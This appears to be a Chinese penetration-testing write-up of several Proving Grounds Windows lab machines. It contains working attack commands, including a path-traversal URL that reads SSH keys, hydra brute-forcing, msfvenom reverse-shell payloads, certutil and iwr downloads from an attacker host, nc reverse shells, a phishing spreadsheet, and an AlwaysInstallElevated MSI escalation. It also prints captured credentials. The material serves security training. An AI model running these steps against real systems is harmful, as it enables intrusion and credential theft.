2   2.66 ms 192.168.45.254
3   2.85 ms 192.168.251.1
4   3.00 ms 192.168.118.179

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 206.60 seconds
```

开发8080的http端口，title是：Argus Surveillance DVR

![image-20250310122650723](./PG_win.assets/image-20250310122650723.png)

使用enum4linux进行信息收集

```
enum4linux 192.168.220.179
```

![image-20250310125133733](./PG_win.assets/image-20250310125133733.png)

未找到可利用点，使用searchsploit检索漏洞，用得上的只有一个文件读取，访问下面url成功读取win.ini

```
http://192.168.220.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fwin.ini&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD=
```

![image-20250310130329804](./PG_win.assets/image-20250310130329804.png)

之前nmap扫描结果显示开放了22端口，搜索一下windows私钥位置`C:\Users\用户名\.ssh\id_rsa`

直接读取Administrator私钥显示不存在，在http服务User这里还有一个用户Viewer

![image-20250310130945762](./PG_win.assets/image-20250310130945762.png)

成功读取Viewer用户私钥

```
http://192.168.220.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F../Users/Administrator/.ssh/id_rsa&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD=
```

![image-20250310130839545](./PG_win.assets/image-20250310130839545.png)

保存到本机

![image-20250310131149008](./PG_win.assets/image-20250310131149008.png)

使用秘钥ssh登录windows（一定一定要修改私钥权限为600

```
chmod 600 id_rsa
ssh Viewer@192.168.220.179 -i id_rsa
```

成功登录系统

![image-20250310131818502](./PG_win.assets/image-20250310131818502.png)

拿到local

![image-20250310131936116](./PG_win.assets/image-20250310131936116.png)

whoami信息收集查看权限

![image-20250310135445722](./PG_win.assets/image-20250310135445722.png)

常规信息收集无果，回想起之前检索漏洞有一个弱密码加密：`5E534D7B6069F641E03BD9BD956BC875EB603CD9D8E1BD8FAAFE`

![image-20250310140213252](./PG_win.assets/image-20250310140213252.png)

利用弱加密算法解出明文密码：`ImWatchingY0u`

![image-20250310155021512](./PG_win.assets/image-20250310155021512.png)

在该文件上面还有一个密码，解密得到`14WatchD0g+Unknown`（最后一位未知，搜了下这个软件不会解密特殊字符，需要手动破解下

![image-20250310160407814](./PG_win.assets/image-20250310160407814.png)

使用runas命令运行命令尝试输入密码：`14WatchD0g$` （输入正确的密码和错误的回显不一样

![image-20250310162651675](./PG_win.assets/image-20250310162651675.png)

传输nc反弹shell

```
iwr -Uri http://192.168.45.161:90/nc.exe -Outfile nc.exe
runas /user:administrator "C:\Users\viewer\Desktop\nc.exe 192.168.45.161 80 -e powershell"
```

![image-20250310162438349](./PG_win.assets/image-20250310162438349.png)

拿到proof

![image-20250310162517247](./PG_win.assets/image-20250310162517247.png)

## Hepet

信息收集：

```
root@iZt4nbifrvtk7cy11744y4Z:~# nmap -p- -Pn -A -sS -T4 192.168.133.140
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-10 16:42 CST
Nmap scan report for 192.168.133.140
Host is up (0.0042s latency).
Not shown: 65512 closed ports
PORT      STATE SERVICE        VERSION
25/tcp    open  smtp           Mercury/32 smtpd (Mail server account Maiser)
| smtp-commands: localhost Hello nmap.scanme.org; ESMTPs are:, TIME, SIZE 0, HELP, 
|_ Recognized SMTP commands are: HELO EHLO MAIL RCPT DATA RSET AUTH NOOP QUIT HELP VRFY SOML Mail server account is 'Maiser'. 
79/tcp    open  finger         Mercury/32 fingerd
| finger: Login: Admin         Name: Mail System Administrator\x0D
| \x0D
|_[No profile information]\x0D
105/tcp   open  ph-addressbook Mercury/32 PH addressbook server
106/tcp   open  pop3pw         Mercury/32 poppass service
110/tcp   open  pop3           Mercury/32 pop3d
|_pop3-capabilities: USER EXPIRE(NEVER) UIDL APOP TOP
135/tcp   open  msrpc          Microsoft Windows RPC
139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
143/tcp   open  imap           Mercury/32 imapd 4.62
|_imap-capabilities: CAPABILITY complete IMAP4rev1 OK AUTH=PLAIN X-MERCURY-1A0001
443/tcp   open  ssl/http       Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.3.23
|_http-title: Time Travel Company Page
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds?
2224/tcp  open  http           Mercury/32 httpd
|_http-title: Mercury HTTP Services
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
8000/tcp  open  http           Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.3.23
|_http-title: Time Travel Company Page
11100/tcp open  vnc            VNC (protocol 3.8)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_vnc-info: ERROR: Script execution failed (use -d to debug)
20001/tcp open  ftp            FileZilla ftpd 0.9.41 beta
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -r--r--r-- 1 ftp ftp            312 Oct 20  2020 .babelrc
| -r--r--r-- 1 ftp ftp            147 Oct 20  2020 .editorconfig
| -r--r--r-- 1 ftp ftp             23 Oct 20  2020 .eslintignore
| -r--r--r-- 1 ftp ftp            779 Oct 20  2020 .eslintrc.js
| -r--r--r-- 1 ftp ftp            167 Oct 20  2020 .gitignore
| -r--r--r-- 1 ftp ftp            228 Oct 20  2020 .postcssrc.js
| -r--r--r-- 1 ftp ftp            346 Oct 20  2020 .tern-project
| drwxr-xr-x 1 ftp ftp              0 Oct 20  2020 build
| drwxr-xr-x 1 ftp ftp              0 Oct 20  2020 config
| -r--r--r-- 1 ftp ftp           1376 Oct 20  2020 index.html
| -r--r--r-- 1 ftp ftp         425010 Oct 20  2020 package-lock.json
| -r--r--r-- 1 ftp ftp           2454 Oct 20  2020 package.json
| -r--r--r-- 1 ftp ftp           1100 Oct 20  2020 README.md
| drwxr-xr-x 1 ftp ftp              0 Oct 20  2020 src
| drwxr-xr-x 1 ftp ftp              0 Oct 20  2020 static
|_-r--r--r-- 1 ftp ftp            127 Oct 20  2020 _redirects
|_ftp-bounce: bounce working!
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
33006/tcp open  unknown
| fingerprint-strings: 
|   GetRequest, HTTPOptions, Help, JavaRMI, LPDString, NULL, RPCCheck, ms-sql-s, oracle-tns: 
|_    Host '192.168.45.161' is not allowed to connect to this MariaDB server
49664/tcp open  msrpc          Microsoft Windows RPC
49665/tcp open  msrpc          Microsoft Windows RPC
49666/tcp open  msrpc          Microsoft Windows RPC
49667/tcp open  msrpc          Microsoft Windows RPC
49668/tcp open  msrpc          Microsoft Windows RPC
49669/tcp open  msrpc          Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33006-TCP:V=7.80%I=7%D=3/10%Time=67CEA600%P=x86_64-pc-linux-gnu%r(N
SF:ULL,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.45\.161'\x20is\x20not\x20a
SF:llowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(GetReque
SF:st,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.45\.161'\x20is\x20not\x20al
SF:lowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(HTTPOptio
SF:ns,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.45\.161'\x20is\x20not\x20al
SF:lowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(RPCCheck,
SF:4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.45\.161'\x20is\x20not\x20allow
SF:ed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(Help,4D,"I\0
SF:\0\x01\xffj\x04Host\x20'192\.168\.45\.161'\x20is\x20not\x20allowed\x20t
SF:o\x20connect\x20to\x20this\x20MariaDB\x20server")%r(LPDString,4D,"I\0\0
SF:\x01\xffj\x04Host\x20'192\.168\.45\.161'\x20is\x20not\x20allowed\x20to\
SF:x20connect\x20to\x20this\x20MariaDB\x20server")%r(JavaRMI,4D,"I\0\0\x01
SF:\xffj\x04Host\x20'192\.168\.45\.161'\x20is\x20not\x20allowed\x20to\x20c
SF:onnect\x20to\x20this\x20MariaDB\x20server")%r(oracle-tns,4D,"I\0\0\x01\
SF:xffj\x04Host\x20'192\.168\.45\.161'\x20is\x20not\x20allowed\x20to\x20co
SF:nnect\x20to\x20this\x20MariaDB\x20server")%r(ms-sql-s,4D,"I\0\0\x01\xff
SF:j\x04Host\x20'192\.168\.45\.161'\x20is\x20not\x20allowed\x20to\x20conne
SF:ct\x20to\x20this\x20MariaDB\x20server");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=3/10%OT=25%CT=1%CU=34552%PV=Y%DS=4%DC=T%G=Y%TM=67CEA6B
OS:8%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=10B%TI=I%CI=I%TS=U)OPS(O1=M5
OS:4ENW0NNS%O2=M54ENW0NNS%O3=M54ENW0%O4=M54ENW0NNS%O5=M54ENW0NNS%O6=M54ENNS
OS:)WIN(W1=4000%W2=4000%W3=4000%W4=4000%W5=4000%W6=4000)ECN(R=Y%DF=Y%T=80%W
OS:=4000%O=M54ENW0NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N
OS:)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0
OS:%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7
OS:(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(
OS:R=N)

Network Distance: 4 hops
Service Info: Host: localhost; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-03-10T08:45:32
|_  start_date: N/A

TRACEROUTE (using port 23/tcp)
HOP RTT     ADDRESS
1   3.06 ms 192.168.45.1
2   3.07 ms 192.168.45.254
3   3.22 ms 192.168.251.1
4   3.58 ms 192.168.133.140

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 196.95 seconds
```

开了非常多的服务，先从20001端口ftp看起，使用Anonymous登录

```
ftp 192.168.133.140 -P 20001
```

![image-20250310165617652](./PG_win.assets/image-20250310165617652.png)

全部下载出来翻了翻，没找到凭证等敏感信息（扫出来这么多东西确实让我束手无策了，翻了很久看了WP，有一个攻击线路图如下

![Walkthrough](./PG_win.assets/Walkthrough.png)

这题入口点在143 imap服务，在8000端口(或者443tls端口，一样的)，收集这些姓名作为字典来爆破服务密码

![image-20250310172124082](./PG_win.assets/image-20250310172124082.png)

保存users.txt

![image-20250310172347758](./PG_win.assets/image-20250310172347758.png)

使用hydra爆破

```
hydra -L ./users.txt -P ~/wordlists.txt 192.168.133.140 -s 143 imap
```

但是使用rockyou字典很久都没有结果，使用cewl工具爬取网站收集密码（4为深度

```
cewl -d 4 https://192.168.133.140 -w zidian.txt  
```

![image-20250310173000677](./PG_win.assets/image-20250310173000677.png)

使用新字典爆破

```
hydra -L users.txt -P zidian.txt 192.168.133.140 -s 143 imap
```

这样就能拿到一个凭证：Jonas/SicMundusCreatusEst

![image-20250310173402783](./PG_win.assets/image-20250310173402783.png)

可以使用telnet登录，参考文章：https://blog.csdn.net/pathfinder163/article/details/6397199

```
telnet 192.168.133.140 143
```

连接后输入凭证

```
a1 LOGIN Jonas SicMundusCreatusEst        #用户登录
a2 LIST "" *            #列出所有信箱列表
a3 SELECT INBOX          #选择收件箱
A04 Search ALL            #查询收件箱所有邮件，这个命令会列出邮箱中所有邮件的 UID，这里搜出来有5个
A05 FETCH 1 BODY[TEXT]      # 获取邮件编号 1 的正文内容
A06 FETCH 2 BODY[TEXT]      # 获取邮件编号 2 的正文内容
A06 FETCH 3 BODY[TEXT]      # 获取邮件编号 2 的正文内容
A06 FETCH 4 BODY[TEXT]      # 获取邮件编号 2 的正文内容
A06 FETCH 5 BODY[TEXT]      # 获取邮件编号 2 的正文内容
```

把邮件全部正文提取出来翻译了下，说**所有电子表格和文档都将先在邮件服务器上直接处理以检查兼容性**

![image-20250310175758900](./PG_win.assets/image-20250310175758900.png)

之前做过这方面的题，可能是制作宏文件钓鱼，这里就制作电子表格

具体制作方法在`PG_Craft` WriteUp有写，不同的是ods表格文件

利用已知的凭证发送文件（应该是可以不认证发邮件

```
sendemail -f 'jonas@localhost' \
  -t 'mailadmin@localhost' \
  -s 192.168.133.140:25 \
  -u 'file' \
  -m 'file' \
  -a reshell.odt
```

收到shell

![image-20250310185423940](./PG_win.assets/image-20250310185423940.png)

拿到local

![image-20250310185756763](./PG_win.assets/image-20250310185756763.png)





使用wmic检索服务为auto时候发现

```
wmic service get name,displayname,pathname,startmode | findstr /i "auto"
```

在当前用户目录下发现一个veyon-service.exe

![image-20250310190110771](./PG_win.assets/image-20250310190110771.png)

检查文件权限，SYSTEM和administartor和目前用户都有完全控制权限(F)

```
icacls "C:\Users\Ela Arwel\Veyon\veyon-service.exe"
```

![image-20250310190557833](./PG_win.assets/image-20250310190557833.png)

其实我这里很好奇为什么这个服务就是高权限用户启动的，GPT给的解释是：

> **为什么是 `SYSTEM` 启动，而不是用户启动**：
>
> - 服务通常是由系统级账户（如 `SYSTEM` 或 `LocalService`）来启动，而不是由普通用户来启动。这是因为服务通常需要更高的权限来执行系统级操作。
> - **`SYSTEM`账户** 是 Windows 中权限最高的账户，能够访问系统的所有资源。因此，`veyon-service.exe` 是由 `SYSTEM` 启动的，通常是为了让该服务拥有系统级的权限执行特权任务。

使用msf生成反弹shell的exe文件

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.161 LPORT=80 -f exe -o reshell.exe   #生成exe
move veyon-service.exe veyon-service.bak    #一定要先把靶机上的veyon-service.exe重命名，直接覆盖或者删除都不行
certutil -f -urlcache http://192.168.45.161:90//reshell.exe veyon-service.exe
```

![image-20250310202412350](./PG_win.assets/image-20250310202412350.png)

然后重启：`shutdown /r /t 0`，监听80端口，收到SYSTEM的shell

![image-20250310202239090](./PG_win.assets/image-20250310202239090.png)

拿到proof

![image-20250310202330561](./PG_win.assets/image-20250310202330561.png)





## Shenzi

信息收集：

```
root@iZt4nbifrvtk7cy11744y4Z:~# nmap -p- -Pn -A -sS -T4 192.168.133.55
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-11 09:40 CST
Nmap scan report for 192.168.133.55
Host is up (0.0027s latency).
Not shown: 65520 closed ports
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           FileZilla ftpd 0.9.41 beta
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
80/tcp    open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.133.55/dashboard/
|_https-redirect: ERROR: Script execution failed (use -d to debug)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
| http-title: Welcome to XAMPP
|_Requested resource was https://192.168.133.55/dashboard/
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql?
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions, Help, Kerberos, NCP, NULL, RPCCheck, SIPOptions, SSLSessionReq, TerminalServerCookie, ms-sql-s, oracle-tns: 
|_    Host '192.168.251.133' is not allowed to connect to this MariaDB server
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.80%I=7%D=3/11%Time=67CF94A4%P=x86_64-pc-linux-gnu%r(NU
SF:LL,4E,"J\0\0\x01\xffj\x04Host\x20'192\.168\.251\.133'\x20is\x20not\x20a
SF:llowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(HTTPOpti
SF:ons,4E,"J\0\0\x01\xffj\x04Host\x20'192\.168\.251\.133'\x20is\x20not\x20
SF:allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(RPCChec
SF:k,4E,"J\0\0\x01\xffj\x04Host\x20'192\.168\.251\.133'\x20is\x20not\x20al
SF:lowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(Help,4E,"
SF:J\0\0\x01\xffj\x04Host\x20'192\.168\.251\.133'\x20is\x20not\x20allowed\
SF:x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(SSLSessionReq,4
SF:E,"J\0\0\x01\xffj\x04Host\x20'192\.168\.251\.133'\x20is\x20not\x20allow
SF:ed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(TerminalServ
SF:erCookie,4E,"J\0\0\x01\xffj\x04Host\x20'192\.168\.251\.133'\x20is\x20no
SF:t\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(Ke
SF:rberos,4E,"J\0\0\x01\xffj\x04Host\x20'192\.168\.251\.133'\x20is\x20not\
SF:x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(Four
SF:OhFourRequest,4E,"J\0\0\x01\xffj\x04Host\x20'192\.168\.251\.133'\x20is\
SF:x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")
SF:%r(SIPOptions,4E,"J\0\0\x01\xffj\x04Host\x20'192\.168\.251\.133'\x20is\
SF:x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")
SF:%r(NCP,4E,"J\0\0\x01\xffj\x04Host\x20'192\.168\.251\.133'\x20is\x20not\
SF:x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(orac
SF:le-tns,4E,"J\0\0\x01\xffj\x04Host\x20'192\.168\.251\.133'\x20is\x20not\
SF:x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(ms-s
SF:ql-s,4E,"J\0\0\x01\xffj\x04Host\x20'192\.168\.251\.133'\x20is\x20not\x2
SF:0allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=3/11%OT=21%CT=1%CU=41687%PV=Y%DS=4%DC=T%G=Y%TM=67CF955
OS:C%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=106%TI=I%CI=I%TS=U)OPS(O1=M
OS:54ENW8NNS%O2=M54ENW8NNS%O3=M54ENW8%O4=M54ENW8NNS%O5=M54ENW8NNS%O6=M54ENN
OS:S)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%
OS:W=FFFF%O=M54ENW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=
OS:N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=
OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T
OS:7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE
OS:(R=N)

Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-03-11T01:43:43
|_  start_date: N/A

TRACEROUTE (using port 1025/tcp)
HOP RTT     ADDRESS
1   2.17 ms 192.168.45.1
2   2.17 ms 192.168.45.254
3   3.21 ms 192.168.251.1
4   3.43 ms 192.168.133.55

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 198.05 seconds
```

使用enum4linux对smb扫描没出现敏感信息，同时ftp匿名登录失败，80和443开放了XAMPP，存在phpmyadmin页面，但是只能本地访问

![image-20250311100513977](./PG_win.assets/image-20250311100513977.png)

在使用enum4linux没找到信息，但是使用smbclient却找到了可访问目录，先使用smbmap查看目录权限

```
smbmap -u guest -H 192.168.133.55
```

![image-20250311100822665](./PG_win.assets/image-20250311100822665.png)

连接到该目录

```
smbclient //192.168.133.55/Shenzi -N
```

![image-20250311100810182](./PG_win.assets/image-20250311100810182.png)

直接`mget *`都下载下来，目前阶段最有用的信息就是密码了（或者用`grep -rinE '(password|username|user|pass|key|token|secret|admin|login|credentials)'`

![image-20250311101120341](./PG_win.assets/image-20250311101120341.png)

```
### XAMPP Default Passwords ###
1) MySQL (phpMyAdmin):
   User: root
   Password:
   (means no password!)

2) FileZilla FTP:
   [ You have to create a new user on the FileZilla Interface ] 

3) Mercury (not in the USB & lite version): 
   User: newuser  
   Password: wampp 

4) WEBDAV: 
   User: xampp-dav-unsecure
   Password: ppmax2011

5) WordPress:
   User: admin
   Password: FeltHeadwallWight357
```

根据密码信息，站点应该还有一个wordpress站点，但是端口和目录扫描都没发现，根据hints是用题目名字为文件目录下面存在wordpress（也就是`/shenzi/`，有点意外

![image-20250311122738678](./PG_win.assets/image-20250311122738678.png)

使用`admin/FeltHeadwallWight357`凭证成功登录后台

![image-20250311123457409](./PG_win.assets/image-20250311123457409.png)

在主题编辑这里

![image-20250311123651757](./PG_win.assets/image-20250311123651757.png)

找一个能访问到的页面

![image-20250311123734759](./PG_win.assets/image-20250311123734759.png)

删除全部代码，写入shell文件

![image-20250311124343008](./PG_win.assets/image-20250311124343008.png)

反弹shell

![image-20250311133434031](./PG_win.assets/image-20250311133434031.png)

传输winPEASany到靶机

```
iwr -uri http://192.168.45.161:90/winPEASany.exe -Outfile winPEASany.exe
```

![image-20250311134405825](./PG_win.assets/image-20250311134405825.png)

运行winPEASany.exe

![image-20250311135220483](./PG_win.assets/image-20250311135220483.png)

找到了当前用户的NTLM：`shenzi::SHENZI:1122334455667788:70c499cce6fdac5ce6497656f790a60f:01010000000000001de618ab4892db0131037d6147a096b7000000000800300030000000000000000000000000200000d6bcd47eac128312a35af33a16fd8ab6f1397234b283aadffa0b8e572a741c9a0a00100000000000000000000000000000000000090000000000000000000000`，但是没有什么利用点

真正值得注意的是，两个都是1（如果运行下面这两个命令，输出都是1，和winPEASany检测原理一样

```
rem 查询本地计算机
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

rem 查询当前用户
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

![image-20250311160910530](./PG_win.assets/image-20250311160910530.png)

可以利用AlwaysInstallElevated创建恶意的msi反弹高权限shell，利用msf创建恶意msi

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.161 LPORT=91 -f msi -o shell.msi
```

上传制作的恶意msi

```
iwr -uri http://192.168.45.161:90/shell.msi -Outfile shell.msi
```

上传并运行恶意的msi文件，监听攻击机91端口获得system权限shell

![image-20250311161643068](./PG_win.assets/image-20250311161643068.png)

拿到proof

![image-20250311161943632](./PG_win.assets/image-20250311161943632.png)

## Nickel

信息收集：

```
root@iZt4nbifrvtk7cy11744y4Z:~# nmap -p- -Pn -A -sS -T4 192.168.133.99
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-11 16:21 CST
NSOCK ERROR [422.6900s] mksock_bind_addr(): Bind to 0.0.0.0:81 failed (IOD #214): Address already in use (98)
Nmap scan report for 192.168.133.99
Host is up (0.0032s latency).
Not shown: 65518 closed ports
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           FileZilla ftpd
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
22/tcp    open  ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 86:84:fd:d5:43:27:05:cf:a7:f2:e9:e2:75:70:d5:f3 (RSA)
|   256 9c:93:cf:48:a9:4e:70:f4:60:de:e1:a9:c2:c0:b6:ff (ECDSA)
|_  256 00:4e:d7:3b:0f:9f:e3:74:4d:04:99:0b:b1:8b:de:a5 (ED25519)
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Site doesn't have a title.
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: NICKEL
|   NetBIOS_Domain_Name: NICKEL
|   NetBIOS_Computer_Name: NICKEL
|   DNS_Domain_Name: nickel
|   DNS_Computer_Name: nickel
|   Product_Version: 10.0.18362
|_  System_Time: 2025-03-11T08:27:23+00:00
| ssl-cert: Subject: commonName=nickel
| Not valid before: 2025-03-10T08:20:47
|_Not valid after:  2025-09-09T08:20:47
|_ssl-date: 2025-03-11T08:28:35+00:00; 0s from scanner time.
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
8089/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Site doesn't have a title.
33333/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Site doesn't have a title.
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=3/11%OT=21%CT=1%CU=31674%PV=Y%DS=4%DC=T%G=Y%TM=67CFF43
OS:4%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=107%TI=I%CI=I%TS=U)OPS(O1=M
OS:54ENW8NNS%O2=M54ENW8NNS%O3=M54ENW8%O4=M54ENW8NNS%O5=M54ENW8NNS%O6=M54ENN
OS:S)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%
OS:W=FFFF%O=M54ENW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=
OS:N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=
OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T
OS:7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE
OS:(R=N)

Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-03-11T08:27:22
|_  start_date: N/A

TRACEROUTE (using port 443/tcp)
HOP RTT     ADDRESS
1   3.20 ms 192.168.45.1
2   3.20 ms 192.168.45.254
3   3.31 ms 192.168.251.1
4   3.75 ms 192.168.133.99

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 423.79 seconds
```

8089端口服务有东西，但是跳转不过去，查看源代码发现IP写的有问题

![image-20250311185810415](./PG_win.assets/image-20250311185810415.png)

